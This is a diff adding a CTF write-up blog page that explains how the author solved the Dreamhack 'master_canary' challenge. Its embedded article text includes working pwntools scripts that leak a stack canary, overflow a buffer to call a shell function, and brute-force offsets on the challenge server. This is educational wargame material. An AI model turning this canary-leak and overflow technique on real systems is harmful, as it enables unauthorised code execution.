@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack master_canary Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다.
+카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요.
+셸을 획득한 후 얻은 &ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+int main(int argc, char *argv[]) {
+    size_t size = 0;
+    pthread_t thread_t;
+    int idx = 0;
+    char leave_comment[32];
+
+    initialize();
+
+    while (1) {
+        printf(&#34;1. Create thread\n&#34;);
+        printf(&#34;2. Input\n&#34;);
+        printf(&#34;3. Exit\n&#34;);
+        printf(&#34;&gt; &#34;);
+        scanf(&#34;%d&#34;, &amp;idx);
+
+        switch (idx) {
+            case 1:
+                if (pthread_create(&amp;thread_t, NULL, thread_routine, NULL) &lt; 0) {
+                    perror(&#34;thread create error&#34;);
+                    exit(0);
+                }
+                break;
+            case 2:
+                printf(&#34;Size: &#34;);
+                scanf(&#34;%lu&#34;, &amp;size);
+
+                printf(&#34;Data: &#34;);
+                read_bytes(global_buffer, size);
+
+                printf(&#34;Data: %s&#34;, global_buffer);
+                break;
+            case 3:
+                printf(&#34;Leave comment: &#34;);
+                read(0, leave_comment, 1024);
+                return 0;
+            default:
+                printf(&#34;Nope\n&#34;);
+                break;
+        }
+    }
+
+    return 0;
+}
+Identifying the vulnerabilities
+So, we can create threads. Interesting. We also have a massive overflow of leave_comment and into the global_buffer.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/master_canary-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/master_canary-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/master_canary-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack master_canary Writeup">
+  <meta property="og:description" content="Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다. 카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요. 셸을 획득한 후 얻은 “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.
+int main(int argc, char *argv[]) { size_t size = 0; pthread_t thread_t; int idx = 0; char leave_comment[32]; initialize(); while (1) { printf(&#34;1. Create thread\n&#34;); printf(&#34;2. Input\n&#34;); printf(&#34;3. Exit\n&#34;); printf(&#34;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); switch (idx) { case 1: if (pthread_create(&amp;thread_t, NULL, thread_routine, NULL) &lt; 0) { perror(&#34;thread create error&#34;); exit(0); } break; case 2: printf(&#34;Size: &#34;); scanf(&#34;%lu&#34;, &amp;size); printf(&#34;Data: &#34;); read_bytes(global_buffer, size); printf(&#34;Data: %s&#34;, global_buffer); break; case 3: printf(&#34;Leave comment: &#34;); read(0, leave_comment, 1024); return 0; default: printf(&#34;Nope\n&#34;); break; } } return 0; } Identifying the vulnerabilities So, we can create threads. Interesting. We also have a massive overflow of leave_comment and into the global_buffer.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-13T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack master_canary Writeup">
+<meta name="twitter:description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다.
+카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요.
+셸을 획득한 후 얻은 &ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+int main(int argc, char *argv[]) {
+    size_t size = 0;
+    pthread_t thread_t;
+    int idx = 0;
+    char leave_comment[32];
+
+    initialize();
+
+    while (1) {
+        printf(&#34;1. Create thread\n&#34;);
+        printf(&#34;2. Input\n&#34;);
+        printf(&#34;3. Exit\n&#34;);
+        printf(&#34;&gt; &#34;);
+        scanf(&#34;%d&#34;, &amp;idx);
+
+        switch (idx) {
+            case 1:
+                if (pthread_create(&amp;thread_t, NULL, thread_routine, NULL) &lt; 0) {
+                    perror(&#34;thread create error&#34;);
+                    exit(0);
+                }
+                break;
+            case 2:
+                printf(&#34;Size: &#34;);
+                scanf(&#34;%lu&#34;, &amp;size);
+
+                printf(&#34;Data: &#34;);
+                read_bytes(global_buffer, size);
+
+                printf(&#34;Data: %s&#34;, global_buffer);
+                break;
+            case 3:
+                printf(&#34;Leave comment: &#34;);
+                read(0, leave_comment, 1024);
+                return 0;
+            default:
+                printf(&#34;Nope\n&#34;);
+                break;
+        }
+    }
+
+    return 0;
+}
+Identifying the vulnerabilities
+So, we can create threads. Interesting. We also have a massive overflow of leave_comment and into the global_buffer.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack master_canary Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/master_canary-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack master_canary Writeup",
+  "name": "Dreamhack master_canary Writeup",
+  "description": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다. 카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요. 셸을 획득한 후 얻은 \u0026ldquo;flag\u0026rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{\u0026hellip;} 입니다.\nint main(int argc, char *argv[]) { size_t size = 0; pthread_t thread_t; int idx = 0; char leave_comment[32]; initialize(); while (1) { printf(\u0026#34;1. Create thread\\n\u0026#34;); printf(\u0026#34;2. Input\\n\u0026#34;); printf(\u0026#34;3. Exit\\n\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); switch (idx) { case 1: if (pthread_create(\u0026amp;thread_t, NULL, thread_routine, NULL) \u0026lt; 0) { perror(\u0026#34;thread create error\u0026#34;); exit(0); } break; case 2: printf(\u0026#34;Size: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;size); printf(\u0026#34;Data: \u0026#34;); read_bytes(global_buffer, size); printf(\u0026#34;Data: %s\u0026#34;, global_buffer); break; case 3: printf(\u0026#34;Leave comment: \u0026#34;); read(0, leave_comment, 1024); return 0; default: printf(\u0026#34;Nope\\n\u0026#34;); break; } } return 0; } Identifying the vulnerabilities So, we can create threads. Interesting. We also have a massive overflow of leave_comment and into the global_buffer.\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다. 카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요. 셸을 획득한 후 얻은 “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.\nint main(int argc, char *argv[]) { size_t size = 0; pthread_t thread_t; int idx = 0; char leave_comment[32]; initialize(); while (1) { printf(\"1. Create thread\\n\"); printf(\"2. Input\\n\"); printf(\"3. Exit\\n\"); printf(\"\u003e \"); scanf(\"%d\", \u0026idx); switch (idx) { case 1: if (pthread_create(\u0026thread_t, NULL, thread_routine, NULL) \u003c 0) { perror(\"thread create error\"); exit(0); } break; case 2: printf(\"Size: \"); scanf(\"%lu\", \u0026size); printf(\"Data: \"); read_bytes(global_buffer, size); printf(\"Data: %s\", global_buffer); break; case 3: printf(\"Leave comment: \"); read(0, leave_comment, 1024); return 0; default: printf(\"Nope\\n\"); break; } } return 0; } Identifying the vulnerabilities So, we can create threads. Interesting. We also have a massive overflow of leave_comment and into the global_buffer.\nThere’s also a get_shell function, and this weird thread_routine:\nvoid *thread_routine() { char buf[256]; global_buffer = buf; } I breakpoint-ed at that exact line, to see what data is in buf at the moment it gets passed to global buffer. I was thinking we can overwrite all the null bytes up to an address, and then when global_buffer is printed we’ll see it.\npwndbg\u003e x/50gx 0x7f1553744d90 0x7f1553744d90: 0x0000000000000000 0x0000000000000000 0x7f1553744da0: 0x0000000000000000 0x0000000000097620 0x7f1553744db0: 0x00007f15537456c0 0x00007ffc749902e7 0x7f1553744dc0: 0x0000000000000000 0x0000000000000000 0x7f1553744dd0: 0x0000000000000000 0x0000000000000000 0x7f1553744de0: 0x0000000000000000 0x0000000000000000 0x7f1553744df0: 0x0000000000000000 0x0000000000000000 0x7f1553744e00: 0x0000000000000000 0x00007f155385d5f1 0x7f1553744e10: 0x0000000000000000 0x5e13e34660140200 Looks like it is - those are some thread stack addresses, the ones that look like libc, and that’s the canary (the last one). I created two threads and leaked both libc and the canary, because at some point doing this I completely forgot that we had a win function.\nAnyways, after you count the bytes up to the canary’s null byte and send the payload, you get the leak. And all thread use the same canary, so we can use that anywhere.\nThen, we just need to create the last payload for the buffer overflow in comment and then get the flag.\nExcept, remotely, of course the canary is at a different offset. I thought I found it, because it was a random canary-looking value like 0x60fd87497505e900, and I just couldn’t find what the hell was wrong with my script. And I got too annoyed to keep testing offsets, so I made a bruteforce with threads. And I got back:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB' found canary 0x0 [+] Opening connection to host8.dreamhack.games on port 20197: Done [*] Closed connection to host8.dreamhack.games port 20197 FOUND FLAG AT OFFSET 2281 Here was that script:\nfrom pwn import * from concurrent.futures import ThreadPoolExecutor elf = ELF('/home/kali/Downloads/dreamhack/master_canary/master_canary') context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:20197' ip, port = cyberedu.split(':') port = int(port) #if args.REMOTE: # p = remote(ip, port) #else: # p = elf.process() def create_thread(p): p.recvuntil(b\"\u003e \") p.sendline(b\"1\") def send_input(p, size, data): p.recvuntil(b\"\u003e \") p.sendline(b\"2\") p.recvuntil(b\": \") p.sendline(size) p.recvuntil(b\": \") p.sendline(data) p.recvuntil(b\": \") printed = p.recvuntil(b\"1.\", drop=True) print(f\"data printed was {printed}\") return printed def exit(p, comment): p.recvuntil(b\"\u003e \") p.sendline(b\"3\") p.recvuntil(b\": \") p.sendline(comment) getshell = 0x400a4b def find_canary(j): i = 8 * j + 1 try: p = remote(ip, port) create_thread(p) canary_leak = send_input(p, str(i), b\"A\"*(i-1) + b\"B\") garbage, canary_bytes = canary_leak.split(b\"B\") canary_bytes = canary_bytes[0:7] canary = u64(canary_bytes.rjust(8, b\"\\x00\")) print(f\"found canary {hex(canary)}\") if canary == 0x0: return payload = (b\"A\" * 40 + p64(canary) + b\"B\"*8 + p64(getshell) ) exit(p, payload) p.sendline(b\"ls\") sleep(1) if b'flag' in p.recvall(): print(f\"FOUND FLAG AT OFFSET {i}\") p.sendline(b\"cat flag\") p.interactive() except: pass with ThreadPoolExecutor(max_workers=10) as executor: executor.map(find_canary, range(0, 500)) And here is the script to actually print the flag:\nfrom pwn import * from concurrent.futures import ThreadPoolExecutor elf = ELF('/home/kali/Downloads/dreamhack/master_canary/master_canary') context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:20197' ip, port = cyberedu.split(':') port = int(port) #if args.REMOTE: # p = remote(ip, port) #else: # p = elf.process() def create_thread(p): p.recvuntil(b\"\u003e \") p.sendline(b\"1\") def send_input(p, size, data): p.recvuntil(b\"\u003e \") p.sendline(b\"2\") p.recvuntil(b\": \") p.sendline(size) p.recvuntil(b\": \") p.sendline(data) p.recvuntil(b\": \") printed = p.recvuntil(b\"1.\", drop=True) print(f\"data printed was {printed}\") return printed def exit(p, comment): p.recvuntil(b\"\u003e \") p.sendline(b\"3\") p.recvuntil(b\": \") p.sendline(comment) getshell = 0x400a4b def find_canary(j): #i = 8 * j + 1 i = 2281 try: p = remote(ip, port) create_thread(p) canary_leak = send_input(p, str(i), b\"A\"*(i-1) + b\"B\") garbage, canary_bytes = canary_leak.split(b\"B\") canary_bytes = canary_bytes[0:7] canary = u64(canary_bytes.rjust(8, b\"\\x00\")) print(f\"found canary {hex(canary)}\") if canary == 0x0: return payload = (b\"A\" * 40 + p64(canary) + b\"B\"*8 + p64(getshell) ) exit(p, payload) p.sendline(b\"ls\") p.interactive() except: pass #with ThreadPoolExecutor(max_workers=10) as executor: # executor.map(find_canary, range(0, 500)) find_canary(0) With the amount of time I tested bad offsets automating it from the start would’ve saved me about an hour and a half.\nAs always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "776",
+  "inLanguage": "en",
+  "datePublished": "2026-05-13T00:00:00Z",
+  "dateModified": "2026-05-13T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/master_canary-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack master_canary Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-13 00:00:00 +0000 UTC'>May 13, 2026</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>이 문제는 서버에서 작동하고 있는 서비스(master_canary)의 바이너리와 소스 코드가 주어집니다.
+카나리 값을 구해 실행 흐름을 조작해 셸을 획득하세요.
+셸을 획득한 후 얻은 &ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> <span style="color:#66d9ef">thread_t</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> leave_comment[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">initialize</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1. Create thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;2. Input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;3. Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (idx) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread_t</span>, NULL, thread_routine, NULL) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;thread create error&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>size);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Data: &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">read_bytes</span>(global_buffer, size);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Data: %s&#34;</span>, global_buffer);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Leave comment: &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, leave_comment, <span style="color:#ae81ff">1024</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nope</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>So, we can create threads. Interesting. We also have a massive overflow of <code>leave_comment</code> and into the <code>global_buffer</code>.</p>
+<p>There&rsquo;s also a <code>get_shell</code> function, and this weird <code>thread_routine</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">thread_routine</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    global_buffer <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I breakpoint-ed at that exact line, to see what data is in <code>buf</code> at the moment it gets passed to global buffer. I was thinking we can overwrite all the null bytes up to an address, and then when <code>global_buffer</code> is printed we&rsquo;ll see it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/50gx 0x7f1553744d90
+</span></span><span style="display:flex;"><span>0x7f1553744d90: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7f1553744da0: 0x0000000000000000      0x0000000000097620
+</span></span><span style="display:flex;"><span>0x7f1553744db0: 0x00007f15537456c0      0x00007ffc749902e7
+</span></span><span style="display:flex;"><span>0x7f1553744dc0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7f1553744dd0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7f1553744de0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7f1553744df0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7f1553744e00: 0x0000000000000000      0x00007f155385d5f1
+</span></span><span style="display:flex;"><span>0x7f1553744e10: 0x0000000000000000      0x5e13e34660140200
+</span></span></code></pre></div><p>Looks like it is - those are some thread stack addresses, the ones that look like libc, and that&rsquo;s the canary (the last one). I created two threads and leaked both libc and the canary, because at some point doing this I completely forgot that we had a win function.</p>
